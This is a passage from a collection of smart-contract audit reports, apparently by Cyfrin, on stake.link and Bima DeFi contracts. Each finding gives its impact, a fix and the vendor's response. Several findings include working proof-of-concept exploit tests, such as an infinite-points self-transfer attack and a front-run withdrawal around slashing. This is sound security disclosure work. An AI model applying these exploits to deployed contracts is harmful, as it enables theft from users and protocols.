117:            IOperatorStaking(address(stakeController)).getRemovedPrincipal(address(this));
118:    }
```
Thus the vault would appear as it had the principal but it wouldn't be withdrawable.

**Recommended Mitigation:** Consider adding a call that the operator or owner can do to `unstakeRemovedPrincipal`

**Stake.link**
Fixed in [b19b58c](https://github.com/stakedotlink/contracts/pull/108/commits/b19b58c9dc97ee2caba4bf91f74271af5ea9a793)

**Cyfrin**
Verified. Support for unstaking removed principal is added.


### `Vault::unbondingActive` can be out of sync with Chainlink and `FundFlowController` bonding

**Description:** Each vault has a call to query whether its currently in an unbonding period, `Vault::unbondingActive`:
```solidity
    function unbondingActive() external view returns (bool) {
        return block.timestamp < stakeController.getClaimPeriodEndsAt(address(this));
    }
```
Here the comparison is `<`.

However in the Chainlink [vault](https://etherscan.io/address/0xbc10f2e862ed4502144c7d632a3459f49dfcdb5e):
```solidity
  function _inClaimPeriod(Staker storage staker) private view returns (bool) {
    if (staker.unbondingPeriodEndsAt == 0 || block.timestamp < staker.unbondingPeriodEndsAt) {
      return false;
    }

    return block.timestamp <= staker.claimPeriodEndsAt;
  }

```

and `FundFlowController::claimPeriodActive` the comparison is `<=`:
```solidity
    function claimPeriodActive() external view returns (bool) {
        uint256 claimPeriodStart = timeOfLastUpdateByGroup[curUnbondedVaultGroup] + unbondingPeriod;
        uint256 claimPeriodEnd = claimPeriodStart + claimPeriod;

        return block.timestamp >= claimPeriodStart && block.timestamp <= claimPeriodEnd;
    }
```

Hence at `block.timestamp == staker.claimPeriodEndsAt` the `unbondingActive` call will give the incorrect answer.

**Impact:** `Vault::unbondingActive` is used in `FundFlowController` to determine which total unbonded and withdrawal orders for upkeep. And also in `VaultControllerStrategy::withdraw`:
```solidity
    function withdraw(uint256 _amount, bytes calldata _data) external onlyStakingPool {
        // @audit claimPeriodActive() does `<= claimPeriodEnd`
        if (!fundFlowController.claimPeriodActive() || _amount > totalUnbonded)
            revert InsufficientTokensUnbonded();

        // ...

        for (uint256 i = 0; i < vaultIds.length; ++i) {
            // ...

            // @audit unbondingActive() does `< claimPeriodEnd`
            if (deposits != 0 && vault.unbondingActive()) {
                if (toWithdraw > deposits) {
                    vault.withdraw(deposits);
                    unbondedRemaining -= deposits;
                    toWithdraw -= deposits;
                } else if (deposits - toWithdraw > 0 && deposits - toWithdraw < minDeposits) {
                    vault.withdraw(deposits);
                    unbondedRemaining -= deposits;
                    break;
                } else {
                    vault.withdraw(toWithdraw);
                    unbondedRemaining -= toWithdraw;
                    break;
                }
            }
        }
```
Hence at `block.timestamp == staker.claimPeriodEndsAt` the withdraw would incorrectly not withdraw anything.

This also applies to `VaultControllerStrategy::_depositToVaults`:
```solidity
                if (vault.unbondingActive()) {
                    totalRebonded += deposits;
                }
```
Where `totalRebonded`, and in turn `totalUnbonded` would be wrong. However that is much less impactful as the vault is just about to go out of claim period and thus void until `FundFlowController::performUpkeep` is called which resets `totalUnbonded`.

**Proof of Concept:** Test that can be added to `vault-controller-strategy.test.ts`:
```javascript
  it('should perform withdrawal at claim period end' , async () => {
    const {accounts, adrs, strategy, token, stakingController, vaults, fundFlowController, updateVaultGroups } =
      await loadFixture(deployFixture)

    // Deposit into vaults
    await strategy.deposit(toEther(500), encodeVaults([]))
    assert.equal(fromEther(await token.balanceOf(adrs.stakingController)), 500)
    for (let i = 0; i < 5; i++) {
      assert.equal(fromEther(await stakingController.getStakerPrincipal(vaults[i])), 100)
    }
    assert.equal(Number((await strategy.globalVaultState())[3]), 5)

    await updateVaultGroups([0, 5, 10], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([1, 6, 11], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([2, 7], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([3, 8], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([4, 9], 100)

    const claimPeriodEnd = Number(await fundFlowController.timeOfLastUpdateByGroup(0)) + unbondingPeriod + claimPeriod

    const balanceBefore = await token.balanceOf(accounts[0])

    // set to claim period end
    await time.setNextBlockTimestamp(claimPeriodEnd)
    await strategy.withdraw(toEther(50), encodeVaults([0, 5]))


    const balanceAfter = await token.balanceOf(accounts[0])

    // nothing was withdrawn
    assert.equal(balanceAfter - balanceBefore, 0n)
  })
```

**Recommended Mitigation:** Consider changing `<` to `<=`:
```diff
    function unbondingActive() external view returns (bool) {
-       return block.timestamp < stakeController.getClaimPeriodEndsAt(address(this));
+       return block.timestamp <= stakeController.getClaimPeriodEndsAt(address(this));
    }
```

**Stake.link**
Fixed in [b19b58c](https://github.com/stakedotlink/contracts/pull/108/commits/b19b58c9dc97ee2caba4bf91f74271af5ea9a793)

**Cyfrin**
Verified. Claim period start is correctly accounted for.


### Potential stale data in `FundFlowController::performUpkeep` can lead to incorrect state updates

**Description:** The `FundFlowController::checkUpkeep` function calculates `nextGroupOpVaultsTotalUnbonded` and `nextGroupComVaultsTotalUnbonded` by iterating over vaults and checking their `unbondingActive` status. This data is then encoded and passed to `performUpkeep` by keepers.

However, there's a potential time delay between `checkUpkeep` and `performUpkeep` execution, which could lead to stale data being used to update the system state. The `unbondingActive` status of vaults is time-sensitive, based on the current block timestamp and each vault's claim period end time. If the `performUpkeep` transaction is delayed due to network congestion or other factors, the `totalUnbonded` values used for updates may no longer accurately reflect the current state of the vaults.

`FundFlowController.sol`
```solidity
function checkUpkeep(bytes calldata) external view returns (bool, bytes memory) {
    // ... (other code)
    (
        uint256[] memory curGroupOpVaultsToUnbond,
        uint256 nextGroupOpVaultsTotalUnbonded
    ) = _getVaultUpdateData(operatorVCS, nextUnbondedVaultGroup);
    // ... (similar for community vaults)
    return (
        true,
        abi.encode(
            curGroupOpVaultsToUnbond,
            nextGroupOpVaultsTotalUnbonded,
            curGroupComVaultsToUnbond,
            nextGroupComVaultsTotalUnbonded
        )
    );
}

function performUpkeep(bytes calldata _data) external {
    // ... (decoding and using potentially stale data)
}
```

**Impact:** The use of stale data in performUpkeep can lead to incorrect state updates. The system may allow more or fewer unbondings than it should, leading to discrepancies between the recorded state and the actual state of the vaults. In a worst-case scenario, funds that should be unbonded might remain locked, or funds that should still be locked might be prematurely released.

**Recommended Mitigation:** Consider modifying `performUpkeep` to recalculate the `totalUnbonded` values at the time of execution, rather than relying on potentially stale data from checkUpkeep.

**Stake.link**
Fixed in [53d6090](https://github.com/stakedotlink/contracts/pull/108/commits/53d60901c171f4b436dcb4b22fe6549ba5dcef05)

**Cyfrin**
Verified. Fixed as recommended.


### Staking rewards susceptible to reward multiplier manipulation

**Description:** For staking in the Chainlink Operator and Community staking pools a staker is rewarded through the Chainlink [RewardVault](https://etherscan.io/address/0x996913c8c08472f584ab8834e925b06D0eb1D813). Here rewards are accrued per time staked.

There is however a twist to how the rewards work compared to the standard rewards design. To promote staying in your position for an extended period of time, Chainlink uses a `multiplier`. This goes from 0 to 1 over a period of 90 days (at time of writing). Just as you start staking you have a multiplier of 0, then i linearly increases to 1 over 90 days.

Were you to unstake during this period, the multiplier is reset and the forfeited rewards you should have earned are distributed to the other stakers.

This can be used to grief LinkPool stakers to reduce their rewards received rewarding stakers outside of LinkPool.

A user could iterate depositing a full vault (+ 1 LINK) and withdrawing a full vault to iterate through the whole current vault group. Thus resetting all the multipliers for the vaults.

**Impact:** A quick overview of the impact using current numbers from the community pool:

Current emission rate for community stakers is `~0.05 LINK/s`. The community vault is currently full with a total of `40875000 LINK` staked. This gives a gain per token per second of `0.05 / 40875000 =~ 1.2e-09`

LinkPool has a total stake `1324452 LINK`, ~3% of the pool.

As mentioned above, the multiplier period is `90 days` and the unbonding period is `4 weeks` which is the fastest you can reset the multiplier.

This gives a reward calculation:
```
perTokenPerS*(staked*0.2)*4 weeks =~ 783 LINK
```
To get the total forfeited you'll need to multiply with `1-(staked time/multiplier period)`:
```
perTokenPerS*(staked*0.2)*4 weeks*(1 - (4 weeks/90 days)) =~ 540 LINK
```
Hence in this case a total of 540 LINK would be lost. Note that this only applies to when the vaults start from 0 multiplier. If a vault was previously at `>90 days` there wouldn't be any forfeit hence the gain is only gotten the second time you do this for a vault group. As it is only then the multiplier is completely reset.

To see the profitability of this, the gained `540 LINK` is split into the pool:
```
540/40875000 = 1.3e-5 per held link
```
If a user has 100 vaults (with maximum deposit 15000 LINK each), this would gain them a total of 19 LINK which is in the ballpark of what the gas would probably cost of this.

Hence the attack vector is pretty small. However there is still a possibility for griefing or un-intended loss of rewards due to vaults having their multiplier unnecessarily reset.

Note, that this is taken with the current community staking pool distribution. The attack grows more profitable the larger the LinkPool stake is.

**Recommended Mitigation:** For the attack vector of resetting all the vaults multipliers it relies on being able to easily iterate through the vaults with deposits + withdrawals. This can be mitigated by implementing a small withdrawal timelock.

For the unintentional loss of rewards that can happen if you withdraw from vaults that have been staking for <90 days, consider enforcing a rotation of the `withdrawalIndex`. Right now any can be chosen but if it always increases (until it loops back) it will hopefully keep vaults "alone" for more than 90 days.

**Stake.link**
Fixed in [9dcac24](https://github.com/stakedotlink/contracts/pull/108/commits/9dcac2435db6d3a1e7d0d222e91b6ffadf99484d)

**Cyfrin**
Verified. Instant staking pool withdrawals disallowed.


\clearpage
## Low Risk


### Lack of validation checks in `PriorityPool::depositQueuedTokens` can trigger temporary delays in queued deposits

**Description:** `PriorityPool::depositQueuedTokens` lacks a validation check to ensure `_queueDepositMin < _queueDepositMax`. This oversight alllows a griefing attack vector where a user can call `depositQueuedTokens` with `_queueDepositMin` as the `max(strategyDepositRoom, canDeposit)` and `_queueDepositMax=0`.

This forces staking pool to always deposit unused deposits into strategy and bypassing any queued amounts in priority pool. In cases where total depositable amount, ie. total queued amount plus unused deposits exceeds the `queuedDepositMin` but just the total queued amount is less than `queuedDepositMin`, the above manipulation would mean that queued deposits are unnecessarily delayed.

**Impact:** Griefing of users who would want their queued amounts to be deposited into strategies as early as possible.

**Recommended Mitigation:** Consider adding a check `_queueDepositMin < _queueDepositMax` in `depositQueuedTokens` function

**Stake.link**
Acknowledged.

**Cyfrin**
Acknowledged.


### FundflowController goes out-of-sync when Chainlink changes their unbonding and claim periods

**Description:** In `FundFlowController` there are two fields: `unbondingPeriod` and `claimPeriod` which should be in sync with the corresponding state in the Chainlink contracts:

```solidity
    uint64 public unbondingPeriod;
    uint64 public claimPeriod;
```

Chainlink can however change these using `StakingPoolBase::setUnbondingPeriod` and `StakingPoolBase::setClaimPeriod`. Since there isn't a call in `FundFlowController` to update the states these changes would not be reflected.


Also, the design of `performUpkeep` doesn't work well if the periods in `FundFlowController` would change:
```solidity
        if (
            timeOfLastUpdateByGroup[nextUnbondedVaultGroup] != 0 &&
            block.timestamp <=
            timeOfLastUpdateByGroup[curUnbondedVaultGroup] + unbondingPeriod + claimPeriod // @audit new periods used
        ) revert NoUpdateNeeded();

        if (
            curUnbondedVaultGroup != 0 &&
            timeOfLastUpdateByGroup[curUnbondedVaultGroup] == 0 &&
            block.timestamp <= timeOfLastUpdateByGroup[curUnbondedVaultGroup - 1] + claimPeriod // @audit new period used
        ) revert NoUpdateNeeded();

        if (block.timestamp < timeOfLastUpdateByGroup[nextUnbondedVaultGroup] + unbondingPeriod) // @audit new period used
            revert NoUpdateNeeded();

...
        // @audit time of unbonding stored, not the resulting unbonding timestamp and claim timestamp
        timeOfLastUpdateByGroup[curUnbondedVaultGroup] = uint64(block.timestamp);
```
Here the time of unbonding is stored and the current state of the unbonding periods is used. The Chainlink contracts applies the delay when unbonding:
```solidity
    staker.unbondingPeriodEndsAt = (block.timestamp + s_pool.configs.unbondingPeriod).toUint128();
    staker.claimPeriodEndsAt = staker.unbondingPeriodEndsAt + s_pool.configs.claimPeriod;
```
Hence at the time of change, `FundFlowController` would go out of sync.

**Impact:** If the `unbonding` and `claim` periods were to change in Chainlink, the state kept in `FundFlowController` would be out of date.

Even if `FundFlowController` were upgraded or a new one deployed the state of the vault groups unbonding and claim periods would effectively be out of date until all have had their periods expire.

This would cause significant disruptions to the withdrawals in the protocol causing user funds to be locked longer than needed.

**Recommended Mitigation:** When a user unbonds in Chainlink, Chainlink saves both the unbonding timestamp and the claim timestamp. We suggest LinkPool does the same. At time of unbonding, consider returning the unbonding and claim timestamp as they were saved at chainlink.

Then the `VaultControllerStrategy` propagates this (since they all _must_ be the same it can just return the last) to the `FundFlowController` which can save the same unbonding and claim timestamps. Then use them for the rotation logic.

**Stake.link**
Acknowledged.

**Cyfrin**
Acknowledged.


### Chainlink can have different bonding and claim periods for Operator and Community staking pools

**Description:** `FundFlowController` uses the same `unbondingPeriod` and `claimPeriod` for both the Operator and Community pools.

Since the Chainlink [Operator](https://etherscan.io/address/0xa1d76a7ca72128541e9fcacafbda3a92ef94fdc5) and [Community](https://etherscan.io/address/0xbc10f2e862ed4502144c7d632a3459f49dfcdb5e) pools are different contracts deployed. Chainlink can change the time periods for unbonding and claiming hence there's no guarantee that they'll always be the same.

**Impact:** Were Chainlink to set different unbonding and claim periods in their operator and community vaults this would affect the ability to withdraw in LinkPool.

Since the state in `FundFlowController` would only be able to accurately track one of them. This could also cause reverts and complications with running `checkUpkeep` since reverts happen in the Chainlink vaults when a claim period is still active. Since the controls in `checkUpkeep` would no longer be up to date this would inevitably happen sometimes.

**Recommended Mitigation:** Consider, instead of having one `FundFlowController` for both the community and operator pools, having one for each. That would give the flexibility to track the different periods separately.

**Stake.link**
Acknowledged.

**Cyfrin**
Acknowledged.


### User can frontrun operator slashing/update rewards by withdrawing from the pool

**Description:** When an operator is slashed a part of their staked principal is removed and transferred to the slasher. This will happen to all the slashable operators configured in the Chainlink [`PriceFeedAlertsController`](https://etherscan.io/address/0x27484ba119d12649be2a9854e4d3b44cc3fdbad7). This slashing would lower the amount of LINK that is staked and thus lower the value of the `stLINK` token.

Note, that it is not technically when the slashing happens the value (exchange rate for LINK) is changed but when the `totalStaked` is updated which is done on the call to `StakingPool::updateStrategyRewards` for the corresponding strategy.

A large holder of `stLINK` could thus have seen the slashing event and then front run the call to `updateStrategyRewards` with withdrawing, thus getting the higher rate of `LINK` than the users still holding.

**Impact:** Using the numbers from [`StakingVault`](https://etherscan.io/address/0xb8b295df2cd735b15be5eb419517aa626fc43cd5) and [`OperatorStakingPool`](https://etherscan.io/address/0xa1d76a7ca72128541e9fcacafbda3a92ef94fdc5):
```
staked=2438937.970114142763711705
shares=2193487.121097554919462043

staked/shares = 1.1118998359533434
```
Given that there are 9 vaults that are currently slashable in the [`PriceFeedAlertsController`](https://etherscan.io/address/0x27484ba119d12649be2a9854e4d3b44cc3fdbad7), that would give a new fx rate of:
```
slashAmount=700

(staked-9*slashedAmout)/shares=1.109027696910718
```
Which is a difference of `0.002` link per share. If you take a position of `~15000 stLINK`, which is roughly one complete vault gives us this will save you `~40 LINK`, which is ~$400, more than the gas cost but not any enormous amount.

**Proof of Concept:**
```solidity
it('user can withdrawal before updateStrategyRewards instant', async () => {
    const { adrs, vaults, signers, token, pp, stakingController, stakingPool, updateVaultGroup}
      = await loadFixture(deployFixture)

    const alice = signers[2]

    await pp.deposit(toEther(475), false, [encodeVaults([])])

    await token.transfer(alice, toEther(25))
    await pp.connect(alice).deposit(toEther(100), false, [encodeVaults([])])

    assert.equal(vaults.length, 5)
    for(let i = 0; i < 5; i++) {
      assert.equal(fromEther(await stakingController.getStakerPrincipal(vaults[i])), 100)
    }

    // unbond all groups
    for(let i = 0; i < 5; i++) {
      await updateVaultGroup(i)

      // don't increase after last iteration to keep the current group in claim period
      if(i < 4) {
        await time.increase(claimPeriod + 1)
      }
    }

    // slashing happens
    await stakingController.slashStaker(vaults[0], toEther(50))
    assert.equal(fromEther(await stakingController.getStakerPrincipal(vaults[0])),50)


    const balanceBefore = await token.balanceOf(alice.address)
    await stakingPool.connect(alice).approve(adrs.pp, toEther(25))
    await pp.connect(alice).withdraw(
      toEther(25),
      toEther(25),
      toEther(25),
      [ethers.ZeroHash],
      false,
      false,
      [encodeVaults([0])]
    )
    const balanceAfter = await token.balanceOf(alice.address)
    assert.equal(balanceAfter - balanceBefore, toEther(25))

    // -1000 because of initial burnt amount
    assert.equal(Number(await stakingPool.balanceOf(signers[0].address)), Number(toEther(475))-1000)

    // when strategy reward are updated it will reduce the values of the shares held by the rest of the stakers
    await stakingPool.updateStrategyRewards([0],'0x')

    assert.equal(Number(await stakingPool.balanceOf(signers[0].address)), Number(toEther(425))-1000)
  })

```

**Recommended Mitigation:** Consider implementing some sort of delay on withdrawals. It doesn't need to be as long as Chainlink just so that it cant be done in one tx.

**Stake.link**
Acknowledged. This issue should be largely mitigated when `RebaseController` is deployed.

**Cyfrin**
Acknowledged.


### Withdrawals when Chainlink pool is paused will take longer than necessary

**Description:** The chainlink docs explain that withdrawals can happen under these circumstances:
```solidity
  /// @dev precondition The caller must be staked in the pool.
  /// @dev precondition The caller must be in the claim period or the pool must be closed or paused.
```
Here they always allow withdrawals to happen when the pool is closed or paused.

This is not reflected in `FundFlowController` as for a withdrawal to happen the pool must be in the correct vault group. Hence "emptying" out the vaults after a pause will take at least 4*claim period.

**Impact:** If the chainlink pool closes clearing out the positions held by LinkPool will take up to 4 times longer than necessary.

**Recommended Mitigation:** Consider allowing withdrawals from vaults outside the current vault group and claim period if the staking controller is paused.

**Stake.link**
Acknowledged.

**Cyfrin**
Acknowledged.

\clearpage
## Gas Optimization


### Gas optimisation of `FundFlowController::_getVaultDepositOrder`

**Description:** In `FundFlowController:: _getVaultDepositOrder`, the first vault is always the vault corresponding to the `groupDepositIndex`, as seen below

```solidity
      if (groupDepositIndex < maxVaultIndex) {
            vaultDepositOrder[0] = groupDepositIndex;
            ++totalVaultsAdded;
            (uint256 withdrawalIndex, ) = _vcs.vaultGroups(groupDepositIndex % numVaultGroups);
            uint256 deposits = IVault(vaults[groupDepositIndex]).getPrincipalDeposits();
            if (
                deposits != maxDeposits && (groupDepositIndex != withdrawalIndex || deposits == 0)
            ) {
                totalDepositsAdded += maxDeposits - deposits;//@audit missing check to see if _toDeposits is already accomodated
            }
        }
```
It is likely that `toDeposit` can be filled with the deposit room of just this vault. In this case, it is prudent to check if `totalDepositsAdded >= _toDeposit` and exit with just a single vault ID in the vault order.

Additionally, in this case, the costly `_sortIndexesDescending` is not necessary as it is only applicable from second vault onwards.

**Recommended Mitigation:** Consider the following:

1. Add a check of `totalDepositsAdded >= _toDeposit` right after vault 0 and return with just a single vault if condition is satisfied.
2. Move the `_sortIndexesDescending` after including vault 0

**Stake.link**
Acknowledged.

**Cyfrin**
Acknowledged.


### Cache storage reads in `FundFlowController::performUpkeep`

**Description:** `FundFlowController::performUpkeep` contains a lot of repetitive reads of storage variables like: `curUnbondedVaultGroup`, `unbondingPeriod`, `claimPeriod`, `timeOfLastUpdateByGroup[curUnbondedVaultGroup]`  and `timeOfLastUpdateByGroup[nextUnbondedVaultGroup]`

**Recommended Mitigation:** Consider caching these to save unnecessary storage reads.

**Stake.link**
Acknowledged.

**Cyfrin**
Acknowledged.


### Optimize VaultGroup and Fee Structs Using Bitwise Operations

**Description:** The current `VaultGroup` and `Fee` structs in the `VaultControllerStrategy` contract are defined as:

```solidity
struct VaultGroup {
    uint64 withdrawalIndex;
    uint128 totalDepositRoom;
}

struct Fee {
    address receiver;
    uint256 basisPoints;
}
```
These structs can be further optimized by packing them into a single uint192, using bitwise operations for access and modification. This is especially beneficial as these structs are used in arrays, potentially leading to significant gas savings. Note that the maximum basisPoints is 10000 (100%), so it can fit into a 32 bit slot.

**Recommended Mitigation:** Consider packing the `VaultGroup` struct into a single uint192 (64 bits for withdrawalIndex, 128 bits for totalDepositRoom) as follows:

```solidity
uint192[] public vaultGroups;

function getVaultGroup(uint256 index) public view returns (uint64 withdrawalIndex, uint128 totalDepositRoom) {
    uint192 group = vaultGroups[index];
    withdrawalIndex = uint64(group);
    totalDepositRoom = uint128(group >> 64);
}

function setVaultGroup(uint256 index, uint64 withdrawalIndex, uint128 totalDepositRoom) internal {
    vaultGroups[index] = uint192(withdrawalIndex) | (uint192(totalDepositRoom) << 64);
}
```
Consider packing the `Fee` struct into a single uint192 (160 bits for address, 32 bits for basisPoints) as follows:

```solidity
uint192[] public fees;

function getFee(uint256 index) public view returns (address receiver, uint32 basisPoints) {
    uint256 fee = fees[index];
    receiver = address(uint160(fee));
    basisPoints = uint32(fee >> 160);
}

function setFee(uint256 index, address receiver, uint32 basisPoints) internal {
    require(basisPoints <= 10000, "Basis points cannot exceed 10000");
    fees[index] = uint192(uint160(receiver)) | (uint192(basisPoints) << 160);
}
```

**Stake.link**
Acknowledged.

**Cyfrin**
Acknowledged.

\clearpage

------ FILE END car/reports_md/2024-09-17-cyfrin-stake-link-v2.0.md ------


------ FILE START car/reports_md/2024-09-27-cyfrin-bima-v2.0.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)
**Assisting Auditors**

 


---

# Findings
## High Risk


### `AllocationVesting` contract can be exploited for infinite points via self-transfer

**Description:** The `AllocationVesting` contract gives points on vesting schedules to team members, investors, influencers and anyone else entitled to a token allocation.

`AllocationVesting::transferPoints` allows users to transfer points however this function does not correctly [handle](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/AllocationVesting.sol#L129-L133) self-transfer meaning users can exploit it by transferring points to themselves, giving themselves infinite points:
```solidity
// update storage - deduct points from `from` using memory cache
allocations[from].points = uint24(fromAllocation.points - points);

// we don't use fromAllocation as it's been modified with _claim()
allocations[from].claimed = allocations[from].claimed - claimedAdjustment;

// @audit doesn't correctly handle self-transfer since the memory
// cache of `toAllocation.points` will still contain the original
// value of `fromAllocation.points`, so this can be exploited by
// self-transfer to get infinite points
//
// update storage - add points to `to` using memory cache
allocations[to].points = toAllocation.points + uint24(points);
```

**Impact:** Anyone entitled to an allocation can give themselves infinite points and hence receive more tokens than they should receive.

**Proof of Concept:** Add the following PoC contract to `test/foundry/dao/AllocationInvestingTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {TestSetup, IBabelVault, ITokenLocker} from "../TestSetup.sol";
import {AllocationVesting} from "./../../../contracts/dao/AllocationVesting.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AllocationVestingTest is TestSetup {
    AllocationVesting internal allocationVesting;

    uint256 internal constant totalAllocation = 100_000_000e18;
    uint256 internal constant maxTotalPreclaimPct = 10;

    function setUp() public virtual override {
        super.setUp();

        allocationVesting = new AllocationVesting(IERC20(address(babelToken)),
                                                  tokenLocker,
                                                  totalAllocation,
                                                  address(babelVault),
                                                  maxTotalPreclaimPct);
    }

    function test_InfinitePointsExploit() external {
        AllocationVesting.AllocationSplit[] memory allocationSplits
            = new AllocationVesting.AllocationSplit[](2);

        uint24 INIT_POINTS = 50000;

        // allocate to 2 users 50% 50%
        allocationSplits[0].recipient = users.user1;
        allocationSplits[0].points = INIT_POINTS;
        allocationSplits[0].numberOfWeeks = 4;

        allocationSplits[1].recipient = users.user2;
        allocationSplits[1].points = INIT_POINTS;
        allocationSplits[1].numberOfWeeks = 4;

        // setup allocations
        uint256 vestingStart = block.timestamp + 1 weeks;
        allocationVesting.setAllocations(allocationSplits, vestingStart);

        // warp to start time
        vm.warp(vestingStart + 1);

        // attacker transfers their total initial point balance to themselves
        vm.prank(users.user1);
        allocationVesting.transferPoints(users.user1, users.user1, INIT_POINTS);

        // attacker then has double the points
        (uint24 points, , , ) = allocationVesting.allocations(users.user1);
        assertEq(points, INIT_POINTS*2);

        // does it again transferring the new larger value
        vm.prank(users.user1);
        allocationVesting.transferPoints(users.user1, users.user1, points);

        // has double again (4x from the initial points)
        (points, , , ) = allocationVesting.allocations(users.user1);
        assertEq(points, INIT_POINTS*4);

        // can go on forever to get infinite points
    }
}
```

Comment out the token transfer inside `AllocationVesting::_claim` since the setup is very basic:
```solidity
        // @audit commented out for PoC
        //vestingToken.transferFrom(vault, msg.sender, claimable);
```

Run with: `forge test --match-test test_InfinitePointsExploit`

**Recommended Mitigation:** Prevent self-transfer in `AllocationVesting::transferPoints`:
```diff
+   error SelfTransfer();

    function transferPoints(address from, address to, uint256 points) external callerOrDelegated(from) {
+       if(from == to) revert SelfTransfer();
```

**Bima:**
Fixed in commit [ce0f8ce](https://github.com/Bima-Labs/bima-v1-core/commit/ce0f8cea6b38b886376f9d543ae2bb9c3b600de9).

**Cyfrin:** Verified.


### The `fetchRewards` function in `CurveDepositToken` and `ConvexDepositToken` causes a loss of accrued rewards

**Description:** The `fetchRewards` function in `CurveDepositToken` and `ConvexDepositToken` [fails](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L218-L221) to call `_updateIntegrals` prior to calling `_fetchRewards`.

This results in a loss of accrued rewards from `block.timestamp - lastUpdate` since:
* `_fetchRewards` [updates](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L243-L244) `lastUpdate` and `periodFinish` using `block.timestamp`
* hence future calls to `_updateIntegrals` will not [increase](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L199-L209) `rewardIntegral[i]` for the duration `block.timestamp - lastUpdate`

Note that [deposit](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L94-L95) and [withdraw](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L111-L112) always call `_updateIntegrals` immediately before calling `_fetchRewards`.

**Impact:** Loss of accrued rewards.

**Recommended Mitigation:** `fetchRewards` should call `_updateIntegrals` before calling `_fetchRewards`:
```diff
function fetchRewards() external {
    require(block.timestamp / 1 weeks >= periodFinish / 1 weeks, "Can only fetch once per week");
+   _updateIntegrals(address(0), 0, totalSupply);
    _fetchRewards();
}
```

`_updateIntegrals` also needs to be changed to not execute the final account-related section in this case:
```diff
+ if (account != address(0)) {
    uint256 integralFor = rewardIntegralFor[account][i];
    if (integral > integralFor) {
        storedPendingReward[account][i] += uint128((balance * (integral - integralFor)) / 1e18);
        rewardIntegralFor[account][i] = integral;
    }
+ }
```

**Bima:**
Fixed in commit [4156484](https://github.com/Bima-Labs/bima-v1-core/commit/415648420ab020b3ee4277a9b3957e84dc81b25a).

**Cyfrin:** Verified.


### Impossible to liquidate borrower when a `TroveManager` instance only has 1 active borrower

**Description:** When a `TroveManager` instance only has 1 active borrower it is impossible to liquidate that borrower since `LiquidationManager::liquidateTroves` only executes code within the [while](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L166) loop and [if](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L192) statement when `troveCount > 1`:
```solidity
uint256 troveCount = troveManager.getTroveOwnersCount();
...
while (trovesRemaining > 0 && troveCount > 1) {
...
if (trovesRemaining > 0 && !troveManagerValues.sunsetting && troveCount > 1) {
```

Because the code inside the `while` loop and `if` statement never gets executed, `totals.totalDebtInSequence` is never set to a value which results in this [revert](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L230):
```solidity
require(totals.totalDebtInSequence > 0, "TroveManager: nothing to liquidate");
```

The same problem applies to `LiquidationManager::batchLiquidateTroves` which has a similar [while](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L287) loop and [if](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L314) statement condition:
```solidity
uint256 troveCount = troveManager.getTroveOwnersCount();
...
while (troveIter < length && troveCount > 1) {
...
if (troveIter < length && troveCount > 1) {
```

And [reverts](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L360) with the same error:
```solidity
require(totals.totalDebtInSequence > 0, "TroveManager: nothing to liquidate");
```

**Impact:** It is impossible to liquidate a borrower when a `TroveManager` instance only has 1 active borrower. The borrower can be liquidated once other borrowers become active on the same `TroveManager` instance but this can result in late liquidation with loss of funds to the protocol.

Additionally it is permanently impossible to liquidate the last active borrower in a `TroveManager` that is sunsetting, since in that case no new active borrowers can be created.

**Proof of Concept:** Add the following PoC contract to `test/foundry/core/LiquidationManagerTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {BorrowerOperationsTest} from "./BorrowerOperationsTest.t.sol";

contract LiquidationManagerTest is BorrowerOperationsTest {

    function setUp() public virtual override {
        super.setUp();

        // verify staked btc trove manager enabled for liquidation
        assertTrue(liquidationMgr.isTroveManagerEnabled(stakedBTCTroveMgr));
    }

    function test_impossibleToLiquidateSingleBorrower() external {
        // depositing 2 BTC collateral (price = $60,000 in MockOracle)
        // use this test to experiment with different hard-coded values
        uint256 collateralAmount = 2e18;

        uint256 debtAmountMax
            = (collateralAmount * _getScaledOraclePrice() / borrowerOps.CCR())
              - INIT_GAS_COMPENSATION;

        _openTrove(users.user1, collateralAmount, debtAmountMax);

        // set new value of btc to $1 which should ensure liquidation
        mockOracle.setResponse(mockOracle.roundId() + 1,
                               int256(1 * 10 ** 8),
                               block.timestamp + 1,
                               block.timestamp + 1,
                               mockOracle.answeredInRound() + 1);
        // warp time to prevent cached price being used
        vm.warp(block.timestamp + 1);

        // then liquidate the user - but it fails since the
